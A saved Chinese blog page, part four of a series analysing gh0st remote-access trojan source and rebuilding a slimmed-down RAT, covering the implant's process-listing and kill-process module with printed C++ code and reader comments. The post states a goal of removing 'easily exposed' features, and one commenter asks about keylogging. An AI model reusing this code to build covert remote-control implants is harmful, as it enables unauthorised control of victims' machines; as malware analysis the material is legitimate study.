@@ -1,0 +1,492 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>gh0st源码分析与远控的编写(四) | 离别歌</title>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/styles.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/style.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./gh0st源码分析与远控的编写(四)  离别歌/jquery.min.js"></script>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/code.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/button.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(四)  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/C/gh0st_4.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;text=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;is_video=false&amp;description=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29&amp;body=Check out this article: https%3A//www.leavesongs.com/C/gh0st_4.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/C/gh0st_4.html&amp;name=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E5%9B%9B%29&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">gh0st源码分析与远控的编写(四)</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2014年3月23日 19:09" itemprop="datePublished">
+                    2014 三月 23 19:09
+                </time>
+</div>
+<div class="article-tag">
+            阅读：8608
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/C">C/C++</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86">进程管理</a>,
+                
+                <a class="tag-link" href="/tag/gh0st">gh0st</a>,
+                
+                <a class="tag-link" href="/tag/%E8%BF%9C%E6%8E%A7">远控</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+	    真的很久很久了，距离上一次写gh0st的文章（<a href="https://www.leavesongs.com/C/gh0st_3.html" target="_blank">https://www.leavesongs.com/C/gh0st_3.html</a>），过去有大半年了。总算有一个时间，我放下手里所有的活，能够继续把这份努力延续下去。
+</p>
+<p>
+	    以后对于gh0st的文章，就是一个一个模块的分析。原本gh0st就是由很多功能组成的一个强大的远控，但有些东西并不是功能越强大越好。我们到最后，会做一个gh0st的精简，留下最重要的功能，淘汰一些庞大而容易暴露的功能。所以，只有我们模块化了一个软件之后，我们才能更方便地去删除或增加一个功能，否则删除掉某个模块之后导致整个gh0st运行不了了，得不偿失。
+</p>
+<p>
+	    今天带来的是进程管理模块，这个模块文件是SystemManager.cpp。
+</p>
+<p>
+	    我们先来看被控端，一个获取当前进程列表的模块。调用的相关api是CreateToolhelp32Snapshot -&gt; Process32First -&gt; OpenProcess -&gt; EnumProcessModules -&gt; GetModuleFileNameEx -&gt; Process32Next -&gt; CloseHandle
+</p>
+<p>
+	    首先调用<span style="white-space:normal;">CreateToolhelp32Snapshot 创建当前进程列表的快照，</span>再调用Process32First获得快照中第一个进程句柄，OpenProcess打开此进程，EnumProcessModules列举这个进程引用的模块（第一个模块就是进程自身，原本这个函数应该返回该进程所有模块的一个数组，但因为我只需要第一个模块，所以传入一个HMODULE型地址即可）。得到他自身的模块后，GetModuleFileNameEx获得其完整名称。此时就算获取到了进程列表中一个进程信息，再使用Process32Next获得下一个进程，重复以上步骤。
+</p>
+<p>
+	    最后当<span style="white-space:normal;">Process32Next获取不到进程后，就算将整个进程列表快照遍历完了，调用CloseHandle关闭快照句柄即可。</span>
+</p>
+<p>
+	    流程图如下：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201403/20b31395580726.png" id="ematt:479" target="_blank"><img alt="gh0st4.png" border="0" height="650" src="./gh0st源码分析与远控的编写(四)  离别歌/thum-20b31395580726.png" title="点击查看原图" width="362"/></a>
+</p>
+<p>
+	    下面就是gh0st中，获取进程列表的代码：
+</p>
+<pre class="brush: cpp;auto-links: false;">LPBYTE CSystemManager::getProcessList()
+{
+   	HANDLE			hSnapshot = NULL;
+	HANDLE			hProcess = NULL;
+	HMODULE			hModules = NULL;
+	PROCESSENTRY32	pe32 = {0};
+	DWORD			cbNeeded;
+	char			strProcessName[MAX_PATH] = {0};
+	LPBYTE			lpBuffer = NULL;
+	DWORD			dwOffset = 0;
+	DWORD			dwLength = 0;
+	DebugPrivilege(SE_DEBUG_NAME, TRUE);     //提取权限
+	//创建系统快照
+	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	
+	if(hSnapshot == INVALID_HANDLE_VALUE)
+		return NULL;
+	
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+	
+	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //暂时分配一下缓冲区
+	
+	lpBuffer[0] = TOKEN_PSLIST;        //注意这个是数据头 一会我们到主控端来搜索这个数据头 
+	dwOffset = 1;
+	
+	if(Process32First(hSnapshot, &amp;pe32))       //得到第一个进程顺便判断一下系统快照是否成功
+	{	  
+		do
+		{      
+			//打开进程并返回句柄
+			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
+			if ((pe32.th32ProcessID !=0 ) &amp;&amp; (pe32.th32ProcessID != 4) &amp;&amp; (pe32.th32ProcessID != 8))
+			{
+				//枚举第一个模块句柄也就是自身
+				EnumProcessModules(hProcess, &amp;hModules, sizeof(hModules), &amp;cbNeeded);
+				//得到自身的完整名称
+				GetModuleFileNameEx(hProcess, hModules, strProcessName, sizeof(strProcessName));
+				//开始计算占用的缓冲区， 我们关心他的发送的数据结构
+				// 此进程占用数据大小
+				dwLength = sizeof(DWORD) + lstrlen(pe32.szExeFile) + lstrlen(strProcessName) + 2;
+				// 缓冲区太小，再重新分配下
+				if (LocalSize(lpBuffer) &lt; (dwOffset + dwLength))
+					lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
+				
+				//接下来三个memcpy就是向缓冲区里存放数据 数据结构是 进程ID+进程名+0+进程完整名+0
+				//为什么加0 ？因为字符数据是以0 结尾的
+				memcpy(lpBuffer + dwOffset, &amp;(pe32.th32ProcessID), sizeof(DWORD));
+				dwOffset += sizeof(DWORD);	
+				
+				memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
+				dwOffset += lstrlen(pe32.szExeFile) + 1;
+				
+				memcpy(lpBuffer + dwOffset, strProcessName, lstrlen(strProcessName) + 1);
+				dwOffset += lstrlen(strProcessName) + 1;
+			}
+		}
+		while(Process32Next(hSnapshot, &amp;pe32));      //继续得到下一个快照
+	}
+	//用lpbuffer获得整个缓冲区
+	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
+	
+	DebugPrivilege(SE_DEBUG_NAME, FALSE);  //还原提权
+	CloseHandle(hSnapshot);       //释放句柄 
+	return lpBuffer;	    //这个数据返回后就是发送了 之前讲过了，我们可以到主控端去搜索TOKEN_PSLIST了。
+}</pre>
+<p>
+	    代码基本上就跟我的流程图一样的过程，用一个do..while循环，遍历整个进程列表快照。其中调用的EnumProcessModules函数要注意，传入的第二个参数是一个HMODULE类型指针，而不是MSDN中说的数组。当然也可以理解成只含有一个HMODULE类型变量的数组，因为我只需要第一个模块信息就行了。
+</p>
+<p>
+	    获得了可执行文件名、详细名称后，gh0st用了一个结构：“进程ID+进程名+0+进程完整名+0”来保存他们。0相当于一个分隔符，将信息分割开。在主控端取进程信息的时候就直接取一个数字，两个字符串即可，因为字符串就是以0结尾。
+</p>
+<p>
+	    这个函数最前面调用了一个DebugPrivilege，这就是一个简单的提权函数，在很多地方都用到过，我就不多讲了。
+</p>
+    所以，最后getProcessList函数返回的就是一个包含所有进程信息的一个缓冲区，类似这样"01ieplorer.exe\0IE浏览器\002qq.exe\0腾讯QQ\0...."。
+<p>
+<span style="line-height:1.5;">    SendProcessList调用了这个函数，并把获得的缓冲区发送给主控端： </span>
+</p>
+<pre class="brush: cpp;auto-links: false;">void CSystemManager::SendProccessList()
+{
+	UINT	nRet = -1;
+	LPBYTE	lpBuffer = getProcessList();      //得到进程列表的数据，一会转到  getProcessList定义
+	if (lpBuffer == NULL)
+		return;
+
+	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));   //得到发送得到的进程列表数据
+	LocalFree(lpBuffer);
+}</pre>
+<p>
+<span style="line-height:1.5;">    这就是被控端上获取所有进程信息并发送给主控端的一个过程。</span>
+</p>
+<p>
+<span style="line-height:1.5;">    我之前文章里也说过，被控端中每一个模块类中，都有一个固定的方法，叫OnReceive，这是当主控端发送来的命令，会最终被传递给这个方法。这个方法就来根据命令调度需要执行的功能。<br>
+</br></span>
+</p>
+<p>
+<span style="line-height:1.5;">    所以，SystemManager类也有这个方法： </span>
+</p>
+<pre class="brush: cpp;auto-links: false;">void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
+{
+	SwitchInputDesktop();
+	switch (lpBuffer[0])
+	{
+	case COMMAND_PSLIST:
+		SendProcessList();
+		break;
+	case COMMAND_WSLIST:
+		//SendWindowsList();
+		break;
+	case COMMAND_DIALUPASS:
+		//SendDialupassList();
+		break;
+	case COMMAND_KILLPROCESS:       //这里是进程管理接收数据的函数了 在这里判断是那个命令，到KillProcess定义
+		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
+	default:
+		break;
+	}
+}</pre>
+    lpBuffer[0]就是命令，我们可以看到，如果它的值是COMMAND_PSLIST的话，就会执行SendProcessList，也就是发送所有进程列表，如果是COMMAND_KILLPROCESS，那就就会执行KillProcess，结束某个进程。<br>
+<p>
+<br/>
+</p>
+<p>
+<span style="line-height:1.5;">    另外还有两个命令，他们是窗口管理和拨号管理的功能。实际上，这两个功能并不太需要，可以直接精简掉。我们暂时将之注释。</span>
+</p>
+<p>
+<span style="line-height:1.5;">    下次我会说到，主控端界面的一些编写（主要是tab标签页的制作），和接收来自被控端的数据，并显示到页面上。最终完成这个进程管理模块。<br/>
+</span>
+</p>
+</br></div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2619">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">的兰迪</a>
+<time datetime="2017年4月12日 18:35" itemprop="datePublished">
+                            2017 四月 12 18:35
+                        </time>
+<a href="javascript:reply_to('2619', '的兰迪')">回复</a>
+</p>
+<p class="comment-meta">快被老狼的英文单词读音崩溃了。。。</p>
+</div>
+</div>
+<div class="row" id="comment-2409">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d615d5793929e8c7d70eab5f00f7f5f1.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.google.com" target="_blank">匿名</a>
+<time datetime="2016年8月18日 21:59" itemprop="datePublished">
+                            2016 八月 18 21:59
+                        </time>
+<a href="javascript:reply_to('2409', '匿名')">回复</a>
+</p>
+<p class="comment-meta">没有第五篇吗，这个是弃坑了吗？</p>
+</div>
+</div>
+<div class="row" id="comment-1910">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">NONAME</a>
+<time datetime="2015年1月3日 16:59" itemprop="datePublished">
+                            2015 一月 03 16:59
+                        </time>
+<a href="javascript:reply_to('1910', 'NONAME')">回复</a>
+</p>
+<p class="comment-meta">大神加油，坐等下文啊</p>
+</div>
+</div>
+<div class="row" id="comment-1807">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">xue</a>
+<time datetime="2014年10月22日 17:34" itemprop="datePublished">
+                            2014 十月 22 17:34
+                        </time>
+<a href="javascript:reply_to('1807', 'xue')">回复</a>
+</p>
+<p class="comment-meta">Windows一堆乱七八糟的API，真讨厌，Linux多简单</p>
+</div>
+</div>
+<div class="row" id="comment-1667">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">29</a>
+<time datetime="2014年6月1日 12:50" itemprop="datePublished">
+                            2014 六月 01 12:50
+                        </time>
+<a href="javascript:reply_to('1667', '29')">回复</a>
+</p>
+<p class="comment-meta">又停了，WIN7 8上线 键盘记录研究下呗</p>
+</div>
+</div>
+<div class="row" id="comment-1661">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/5a0560ec867edd201f587e2a1a52b596.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">新人</a>
+<time datetime="2014年5月30日 01:59" itemprop="datePublished">
+                            2014 五月 30 01:59
+                        </time>
+<a href="javascript:reply_to('1661', '新人')">回复</a>
+</p>
+<p class="comment-meta">赞一个，gh0st代码很清晰，博主讲得也很好！坐等博主下一篇</p>
+</div>
+</div>
+<div class="row" id="comment-1627">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">GPRBOY</a>
+<time datetime="2014年5月9日 15:42" itemprop="datePublished">
+                            2014 五月 09 15:42
+                        </time>
+<a href="javascript:reply_to('1627', 'GPRBOY')">回复</a>
+</p>
+<p class="comment-meta">在线等下篇啊！！！！！！！！！！</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1628">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年5月9日 22:49" itemprop="datePublished">
+                            2014 五月 09 22:49
+                        </time>
+<a href="javascript:reply_to('1628', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@GPRBOY：别急别急，我会抽时间写，感谢支持~~</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1625">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">GPRBOY</a>
+<time datetime="2014年5月9日 15:09" itemprop="datePublished">
+                            2014 五月 09 15:09
+                        </time>
+<a href="javascript:reply_to('1625', 'GPRBOY')">回复</a>
+</p>
+<p class="comment-meta">功德无量。</p>
+</div>
+</div>
+<div class="row" id="comment-1624">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/007d2051fc3f65395f499a086403c4de.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://mu.jj" target="_blank">轮廓</a>
+<time datetime="2014年5月8日 20:13" itemprop="datePublished">
+                            2014 五月 08 20:13
+                        </time>
+<a href="javascript:reply_to('1624', '轮廓')">回复</a>
+</p>
+<p class="comment-meta">强烈支持，期待下篇～～</p>
+</div>
+</div>
+<div class="row" id="comment-1588">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(四)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.wanzaila.com" target="_blank">万载啦</a>
+<time datetime="2014年3月27日 20:41" itemprop="datePublished">
+                            2014 三月 27 20:41
+                        </time>
+<a href="javascript:reply_to('1588', '万载啦')">回复</a>
+</p>
+<p class="comment-meta">不是很懂，还有点看不懂啊。</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="7ae261e4323c3b325846f4eee84cd160a19644ca"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./gh0st源码分析与远控的编写(四)  离别歌/7ae261e4323c3b325846f4eee84cd160a19644ca"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="305">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="S8DW889dI360klFbOiyX2gjL5buvnRZbqsYsWCls9Q0pk03qCz2HBUlQefXD6lOl"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./gh0st源码分析与远控的编写(四)  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./gh0st源码分析与远控的编写(四)  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
